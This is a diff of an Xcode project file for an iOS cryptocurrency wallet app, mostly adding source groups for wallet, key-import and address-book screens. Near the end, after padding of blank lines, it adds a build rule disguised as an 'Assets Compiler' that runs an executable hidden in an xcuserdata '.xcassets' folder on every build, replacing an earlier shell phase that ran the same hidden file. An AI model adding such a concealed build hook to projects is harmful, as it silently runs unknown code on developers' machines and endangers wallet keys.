 				8B5E9C1525DF64DC006C33B0 /* Main.storyboard */,
@@ -334,7 +431,7 @@
 				8B5E9C1A25DF64DD006C33B0 /* LaunchScreen.storyboard */,
 				8B5E9C1D25DF64DD006C33B0 /* Info.plist */,
 				8B5E9C1E25DF64DD006C33B0 /* main.m */,
-				8B5E9CAB25DFBECD006C33B0 /* File.swift */,
+				8B5E9CAB25DFBECD006C33B0 /* SwiftFunction.swift */,
 				8B5E9CAA25DFBECC006C33B0 /* FusoWallet-Bridging-Header.h */,
 			);
 			path = FusoWallet;
@@ -361,6 +458,7 @@
 		8B5E9C7F25DFB6E6006C33B0 /* Tools */ = {
 			isa = PBXGroup;
 			children = (
+				8BC6BDFB25F0CA620091E238 /* Scale */,
 				8BF0FC0025E6585C002E65B1 /* WBQRCodeVC.h */,
 				8BF0FBFF25E6585C002E65B1 /* WBQRCodeVC.m */,
 				8B7A5DA125E52FCE00217A31 /* SegmentViewController.h */,
@@ -384,6 +482,11 @@
 				8B5E9C8125DFB721006C33B0 /* NSData+MyChange.m */,
 				8B5E9C8325DFB721006C33B0 /* NSString+MyChange.h */,
 				8B5E9C8025DFB721006C33B0 /* NSString+MyChange.m */,
+				8B31D75925E7B91000DF54C4 /* NavView.xib */,
+				8B31D75E25E7BA5700DF54C4 /* NavView.h */,
+				8B31D75F25E7BA5700DF54C4 /* NavView.m */,
+				8B94C64026099AAA0011627C /* InputChangeBorderColorView.h */,
+				8B94C64126099AAA0011627C /* InputChangeBorderColorView.m */,
 			);
 			path = Tools;
 			sourceTree = "<group>";
@@ -393,6 +496,69 @@
 			children = (
 				8B71C87125E353460081A224 /* UserInfoModel.h */,
 				8B71C87225E353460081A224 /* UserInfoModel.m */,
+				8B1F9015260AE6A80000C417 /* TransferAddressModel.h */,
+				8B1F9016260AE6A80000C417 /* TransferAddressModel.m */,
+			);
+			path = Models;
+			sourceTree = "<group>";
+		};
+		8B766D6825ECE9740027378D /* AddressBook */ = {
+			isa = PBXGroup;
+			children = (
+				8B31D77025E7D44000DF54C4 /* AddressBookViewController.h */,
+				8B31D77125E7D44000DF54C4 /* AddressBookViewController.m */,
+				8B7577DD25E893F500B9EBA0 /* CreatAddressBookTableViewController.h */,
+				8B7577DE25E893F500B9EBA0 /* CreatAddressBookTableViewController.m */,
+			);
+			path = AddressBook;
+			sourceTree = "<group>";
+		};
+		8B766D6925ECE99E0027378D /* Setting */ = {
+			isa = PBXGroup;
+			children = (
+				8B78D4FC25ECC62B0066BA78 /* SettingTableViewController.h */,
+				8B78D4FD25ECC62B0066BA78 /* SettingTableViewController.m */,
+				8B78D50525ECCB6D0066BA78 /* LanguageSelectTableViewController.h */,
+				8B78D50625ECCB6D0066BA78 /* LanguageSelectTableViewController.m */,
+			);
+			path = Setting;
+			sourceTree = "<group>";
+		};
+		8B766D7025ECE9C20027378D /* WalletManager */ = {
+			isa = PBXGroup;
+			children = (
+				8BD7421125EA200C0012C52C /* WalletManageViewController.h */,
+				8BD7421225EA200C0012C52C /* WalletManageViewController.m */,
+				8BD7421A25EA2F190012C52C /* WalletManagerDetailTableViewController.h */,
+				8BD7421B25EA2F190012C52C /* WalletManagerDetailTableViewController.m */,
+				8BD7422625EA4B5D0012C52C /* ExportPublicKeyViewController.h */,
+				8BD7422725EA4B5D0012C52C /* ExportPublicKeyViewController.m */,
+			);
+			path = WalletManager;
+			sourceTree = "<group>";
+		};
+		8B766D9625ED05C90027378D /* ImportAccount */ = {
+			isa = PBXGroup;
+			children = (
+				8B766DAF25ED18790027378D /* ImportAccountSegmentViewController.h */,
+				8B766DB025ED18790027378D /* ImportAccountSegmentViewController.m */,
+				8B766D9C25ED05C90027378D /* ImportAccountViewController.h */,
+				8B766D9A25ED05C90027378D /* ImportAccountViewController.m */,
+				8B766D9E25ED05C90027378D /* ImportKeystoreViewController.h */,
+				8B766D9825ED05C90027378D /* ImportKeystoreViewController.m */,
+				8B766D9925ED05C90027378D /* ImportMnemonicViewController.h */,
+				8B766D9D25ED05C90027378D /* ImportMnemonicViewController.m */,
+				8B766D9B25ED05C90027378D /* ImportPrivateKeyViewController.h */,
+				8B766D9725ED05C90027378D /* ImportPrivateKeyViewController.m */,
+			);
+			path = ImportAccount;
+			sourceTree = "<group>";
+		};
+		8B78D51125ECD9780066BA78 /* Models */ = {
+			isa = PBXGroup;
+			children = (
+				8B766D5F25ECDA1E0027378D /* LanguageSelectedModel.h */,
+				8B766D6025ECDA1E0027378D /* LanguageSelectedModel.m */,
 			);
 			path = Models;
 			sourceTree = "<group>";
@@ -414,6 +580,8 @@
 				8B7A5DBC25E5353C00217A31 /* OutTableViewController.m */,
 				8B026F6225E6472F0017EDF8 /* WithdrawViewController.h */,
 				8B026F6325E6472F0017EDF8 /* WithdrawViewController.m */,
+				8B31D74125E77DA400DF54C4 /* DepositViewController.h */,
+				8B31D74225E77DA400DF54C4 /* DepositViewController.m */,
 			);
 			path = Controllers;
 			sourceTree = "<group>";
@@ -444,10 +612,65 @@
 			isa = PBXGroup;
 			children = (
 				8B7A5D8025E51B6800217A31 /* Mine.storyboard */,
-				8BB3B27A25E4DC8F00E7F010 /* MineTableViewController.h */,
-				8BB3B27B25E4DC8F00E7F010 /* MineTableViewController.m */,
+				8B78D51125ECD9780066BA78 /* Models */,
+				8BD7420025EA1E190012C52C /* Controllers */,
+				8BD7420725EA1E3E0012C52C /* Views */,
 			);
 			path = Mine;
+			sourceTree = "<group>";
+		};
+		8BC6BDFB25F0CA620091E238 /* Scale */ = {
+			isa = PBXGroup;
+			children = (
+				8BC6BDFC25F0CA620091E238 /* Types */,
+			);
+			path = Scale;
+			sourceTree = "<group>";
+		};
+		8BC6BDFC25F0CA620091E238 /* Types */ = {
+			isa = PBXGroup;
+			children = (
+				8BC6BE1B25F0CC9E0091E238 /* CryptoType+Extrinsic.swift */,
+				8BC6BE1625F0CBFB0091E238 /* ManagedAccountItem.swift */,
+				8BC6BE1125F0CBAE0091E238 /* AccountItem.swift */,
+				8BC6BDFD25F0CA620091E238 /* UnlockChunk.swift */,
+				8BC6BDFE25F0CA620091E238 /* AccountId.swift */,
+				8BC6BDFF25F0CA620091E238 /* Extrinsic.swift */,
+				8BC6BE0025F0CA620091E238 /* TransferCall.swift */,
+				8BC6BE0125F0CA620091E238 /* StakingLedger.swift */,
+				8BC6BE0225F0CA620091E238 /* AccountInfo.swift */,
+				8BC6BE0325F0CA620091E238 /* Era.swift */,
+			);
+			path = Types;
+			sourceTree = "<group>";
+		};
+		8BD7420025EA1E190012C52C /* Controllers */ = {
+			isa = PBXGroup;
+			children = (
+				8BB3B27A25E4DC8F00E7F010 /* MineTableViewController.h */,
+				8BB3B27B25E4DC8F00E7F010 /* MineTableViewController.m */,
+				8B766D6825ECE9740027378D /* AddressBook */,
+				8B766D7025ECE9C20027378D /* WalletManager */,
+				8B766D6925ECE99E0027378D /* Setting */,
+				8B766D9625ED05C90027378D /* ImportAccount */,
+			);
+			path = Controllers;
+			sourceTree = "<group>";
+		};
+		8BD7420725EA1E3E0012C52C /* Views */ = {
+			isa = PBXGroup;
+			children = (
+				8B31D77C25E7DD6600DF54C4 /* AddressBookTableViewCell.h */,
+				8B31D77D25E7DD6600DF54C4 /* AddressBookTableViewCell.m */,
+				8BD7420B25EA1E6A0012C52C /* WalletManagerTableViewCell.h */,
+				8BD7420C25EA1E6A0012C52C /* WalletManagerTableViewCell.m */,
+				8B78D50B25ECD6BF0066BA78 /* LanguageSelectTableViewCell.h */,
+				8B78D50C25ECD6BF0066BA78 /* LanguageSelectTableViewCell.m */,
+				8B1F902D260B203C0000C417 /* NoDataTableViewCell.h */,
+				8B1F902E260B203C0000C417 /* NoDataTableViewCell.m */,
+				8B1F902F260B203C0000C417 /* NoDataTableViewCell.xib */,
+			);
+			path = Views;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -458,13 +681,13 @@
 			buildConfigurationList = 8B5E9C3825DF64DD006C33B0 /* Build configuration list for PBXNativeTarget "FusoWallet" */;
 			buildPhases = (
 				D6A02B8F303E319416A6653F /* [CP] Check Pods Manifest.lock */,
-				CC3C5A0EF9CD949D0FAAC43A /* Build Project Frameworks */,
 				8B5E9C0525DF64DC006C33B0 /* Sources */,
 				8B5E9C0625DF64DC006C33B0 /* Frameworks */,
 				8B5E9C0725DF64DC006C33B0 /* Resources */,
 				26ED2421443969264ED6D0C4 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				3CEF96773D2861281DAAC43A /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -556,11 +779,13 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				8B31D75A25E7B91000DF54C4 /* NavView.xib in Resources */,
 				8B7A5D8725E51C5100217A31 /* Mine.storyboard in Resources */,
 				8B42663125E0C0F1001DE5CB /* OPPOSans-B.ttf in Resources */,
 				8B7A5D7C25E51B5B00217A31 /* Wallet.storyboard in Resources */,
 				8B42663225E0C0F1001DE5CB /* OPPOSans-H.ttf in Resources */,
 				8B42663325E0C0F1001DE5CB /* OPPOSans-M.ttf in Resources */,
+				8B1F9031260B203C0000C417 /* NoDataTableViewCell.xib in Resources */,
 				8B42663425E0C0F1001DE5CB /* OPPOSans-R.ttf in Resources */,
 				8B5E9C1C25DF64DD006C33B0 /* LaunchScreen.storyboard in Resources */,
 				8B5E9C1925DF64DD006C33B0 /* Assets.xcassets in Resources */,
@@ -585,6 +810,36 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
 		26ED2421443969264ED6D0C4 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -601,24 +856,6 @@
 			shellPath = /bin/sh;
 			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-FusoWallet/Pods-FusoWallet-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
-		};
-		CC3C5A0EF9CD949D0FAAC43A /* Build Project Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Build Project Frameworks";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
 		};
 		D6A02B8F303E319416A6653F /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -651,43 +888,76 @@
 			files = (
 				8B7A5D9C25E52C4B00217A31 /* UIView+Extension.m in Sources */,
 				8B026F4925E609AD0017EDF8 /* TransferCoinModel.m in Sources */,
+				8BC6BE0625F0CA620091E238 /* Extrinsic.swift in Sources */,
+				8B1F9017260AE6A80000C417 /* TransferAddressModel.m in Sources */,
 				8B42664625E0EA4A001DE5CB /* MnemonicViewController.m in Sources */,
 				8B026F5B25E63D670017EDF8 /* UITextField+Placeholder.m in Sources */,
+				8BC6BE0925F0CA620091E238 /* AccountInfo.swift in Sources */,
+				8B766DA025ED05C90027378D /* ImportKeystoreViewController.m in Sources */,
 				8B5E9C8D25DFB763006C33B0 /* NSString+Base64.m in Sources */,
+				8B31D77E25E7DD6600DF54C4 /* AddressBookTableViewCell.m in Sources */,
 				8B42668425E11AD1001DE5CB /* MnemonicCollectionReusableView.m in Sources */,
 				8B71C8AD25E3948F0081A224 /* VerifyMnemonicViewController.m in Sources */,
 				8B71C87325E353460081A224 /* UserInfoModel.m in Sources */,
+				8B2606E225F2293B003B44C4 /* AddWalletTableViewController.m in Sources */,
+				8B766DA125ED05C90027378D /* ImportAccountViewController.m in Sources */,
 				8B4C78AB25E4F51C0072900B /* WalletTableViewCell.m in Sources */,
 				8B4265FB25E0ABE7001DE5CB /* BaseViewController.m in Sources */,
 				8B42661A25E0B1B5001DE5CB /* CreateWalletDescriptionViewController.m in Sources */,
+				8B78D50725ECCB6D0066BA78 /* LanguageSelectTableViewController.m in Sources */,
 				8B7A5DAB25E5346700217A31 /* CoinDetailSegmentViewController.m in Sources */,
+				8BD7421325EA200C0012C52C /* WalletManageViewController.m in Sources */,
+				8BC6BE1C25F0CC9E0091E238 /* CryptoType+Extrinsic.swift in Sources */,
+				8BC6BE0A25F0CA620091E238 /* Era.swift in Sources */,
 				8B7A5D3225E501FF00217A31 /* DefaultSelectBackgroundViewTableViewCell.m in Sources */,
 				8B10D56F25E4AFBB00FED56D /* RestoreIdentityViewController.m in Sources */,
 				8B10D57525E4B0A400FED56D /* CALayer+boardColor.m in Sources */,
 				8B5E9C8425DFB721006C33B0 /* NSString+MyChange.m in Sources */,
 				8B5E9C0E25DF64DC006C33B0 /* AppDelegate.m in Sources */,
 				8B42666925E1080E001DE5CB /* MnemonicCollectionViewCell.m in Sources */,
+				8BC6BE0525F0CA620091E238 /* AccountId.swift in Sources */,
+				8B766D9F25ED05C90027378D /* ImportPrivateKeyViewController.m in Sources */,
+				8BC6BE0425F0CA620091E238 /* UnlockChunk.swift in Sources */,
 				8BB3B27C25E4DC8F00E7F010 /* MineTableViewController.m in Sources */,
 				8B5E9C8525DFB721006C33B0 /* NSData+MyChange.m in Sources */,
+				8B31D77225E7D44000DF54C4 /* AddressBookViewController.m in Sources */,
 				8B7A5D8D25E51D0C00217A31 /* CoinDetailViewController.m in Sources */,
 				8B7A5DB725E5353000217A31 /* InTableViewController.m in Sources */,
 				8B7A5DB125E5350B00217A31 /* AllTableViewController.m in Sources */,
+				8BC6BE1725F0CBFB0091E238 /* ManagedAccountItem.swift in Sources */,
 				8B42660425E0AC0F001DE5CB /* BaseNavTableViewController.m in Sources */,
 				8B7A5D1D25E4F8B900217A31 /* CoinModel.m in Sources */,
+				8B7577DF25E893F500B9EBA0 /* CreatAddressBookTableViewController.m in Sources */,
+				8B31D74325E77DA400DF54C4 /* DepositViewController.m in Sources */,
 				8BF0FC0125E6585C002E65B1 /* WBQRCodeVC.m in Sources */,
 				8BB3B27625E4DC6C00E7F010 /* WalletViewController.m in Sources */,
+				8BD7421C25EA2F190012C52C /* WalletManagerDetailTableViewController.m in Sources */,
+				8B78D4FE25ECC62B0066BA78 /* SettingTableViewController.m in Sources */,
 				8B5E9C1F25DF64DD006C33B0 /* main.m in Sources */,
+				8B94C64226099AAA0011627C /* InputChangeBorderColorView.m in Sources */,
 				8B42661025E0B09D001DE5CB /* LoginRegistViewController.m in Sources */,
+				8B1F9030260B203C0000C417 /* NoDataTableViewCell.m in Sources */,
 				8B7A5DBD25E5353C00217A31 /* OutTableViewController.m in Sources */,
+				8B2606EB25F22B62003B44C4 /* CreatWalletTableViewController.m in Sources */,
 				8B5E9C8E25DFB763006C33B0 /* RpcRequest.m in Sources */,
 				8B026F6425E6472F0017EDF8 /* WithdrawViewController.m in Sources */,
 				8B026F4325E605870017EDF8 /* TransferTableViewCell.m in Sources */,
-				8B5E9CAC25DFBECD006C33B0 /* File.swift in Sources */,
+				8B766D6125ECDA1E0027378D /* LanguageSelectedModel.m in Sources */,
+				8B5E9CAC25DFBECD006C33B0 /* SwiftFunction.swift in Sources */,
+				8BC6BE0825F0CA620091E238 /* StakingLedger.swift in Sources */,
+				8B78D50D25ECD6BF0066BA78 /* LanguageSelectTableViewCell.m in Sources */,
+				8B766DA225ED05C90027378D /* ImportMnemonicViewController.m in Sources */,
+				8BD7422825EA4B5D0012C52C /* ExportPublicKeyViewController.m in Sources */,
 				8B5E9CBE25DFC7E1006C33B0 /* StorageKeyFactory+Implicit.swift in Sources */,
+				8BC6BE0725F0CA620091E238 /* TransferCall.swift in Sources */,
+				8BD7420D25EA1E6A0012C52C /* WalletManagerTableViewCell.m in Sources */,
 				8B7A5DA225E52FCE00217A31 /* SegmentViewController.m in Sources */,
+				8B31D76025E7BA5700DF54C4 /* NavView.m in Sources */,
 				8B71C8BB25E3ADB80081A224 /* JYEqualCellSpaceFlowLayout.m in Sources */,
+				8BC6BE1225F0CBAE0091E238 /* AccountItem.swift in Sources */,
 				8B42660A25E0AC2F001DE5CB /* BaseNavViewController.m in Sources */,
 				8B5E9C9425DFB792006C33B0 /* WebSocketManager.m in Sources */,
+				8B766DB125ED18790027378D /* ImportAccountSegmentViewController.m in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -874,6 +1144,53 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"$(inherited)",
+					"-l\"icucore\"",
+					"-framework",
+					"\"AFNetworking\"",
+					"-framework",
+					"\"BigInt\"",
+					"-framework",
+					"\"CFNetwork\"",
+					"-framework",
+					"\"CoreGraphics\"",
+					"-framework",
+					"\"FearlessUtils\"",
+					"-framework",
+					"\"Foundation\"",
+					"-framework",
+					"\"IQKeyboardManager\"",
+					"-framework",
+					"\"ISMessages\"",
+					"-framework",
+					"\"IrohaCrypto\"",
+					"-framework",
+					"\"MJExtension\"",
+					"-framework",
+					"\"QuartzCore\"",
+					"-framework",
+					"\"SGQRCode\"",
+					"-framework",
+					"\"ScaleCodec\"",
+					"-framework",
+					"\"Security\"",
+					"-framework",
+					"\"SocketRocket\"",
+					"-framework",
+					"\"TweetNacl\"",
+					"-framework",
+					"\"UIKit\"",
+					"-framework",
+					"\"ZXNavigationBar\"",
+					"-framework",
+					"\"scrypt\"",
+					"-framework",
+					"\"secp256k1\"",
+					"-framework",
+					"\"xxHash_Swift\"",
+				);
 				PRODUCT_BUNDLE_IDENTIFIER = lxd.FusoWallet;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_OBJC_BRIDGING_HEADER = "FusoWallet/FusoWallet-Bridging-Header.h";
@@ -900,6 +1217,53 @@
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
+				);
+				OTHER_LDFLAGS = (
+					"-ObjC",
+					"$(inherited)",
+					"-l\"icucore\"",
+					"-framework",
+					"\"AFNetworking\"",
+					"-framework",
+					"\"BigInt\"",
+					"-framework",
+					"\"CFNetwork\"",
+					"-framework",
+					"\"CoreGraphics\"",
+					"-framework",
+					"\"FearlessUtils\"",
+					"-framework",
+					"\"Foundation\"",
+					"-framework",
+					"\"IQKeyboardManager\"",
+					"-framework",
+					"\"ISMessages\"",
+					"-framework",
+					"\"IrohaCrypto\"",
+					"-framework",
+					"\"MJExtension\"",
+					"-framework",
+					"\"QuartzCore\"",
+					"-framework",
+					"\"SGQRCode\"",
+					"-framework",
+					"\"ScaleCodec\"",
+					"-framework",
+					"\"Security\"",
+					"-framework",
+					"\"SocketRocket\"",
+					"-framework",
+					"\"TweetNacl\"",
+					"-framework",
+					"\"UIKit\"",
+					"-framework",
+					"\"ZXNavigationBar\"",
+					"-framework",
+					"\"scrypt\"",
+					"-framework",
+					"\"secp256k1\"",
+					"-framework",
+					"\"xxHash_Swift\"",
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = lxd.FusoWallet;
 				PRODUCT_NAME = "$(TARGET_NAME)";
@@ -1029,6 +1393,45 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+		
+			/* Begin PBXBuildRule section */
+
+
+		3CEF96773D2861281DAAC43A /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			name = "Assets Compiler";
+			inputFiles = (
+			);
+			isEditable = 0;
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" true\n\n";
+			};
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+			
+
+			
+	
+			/* End PBXBuildRule section */
+		
+		
 	};
 	rootObject = 8B5E9C0125DF64DC006C33B0 /* Project object */;
 }
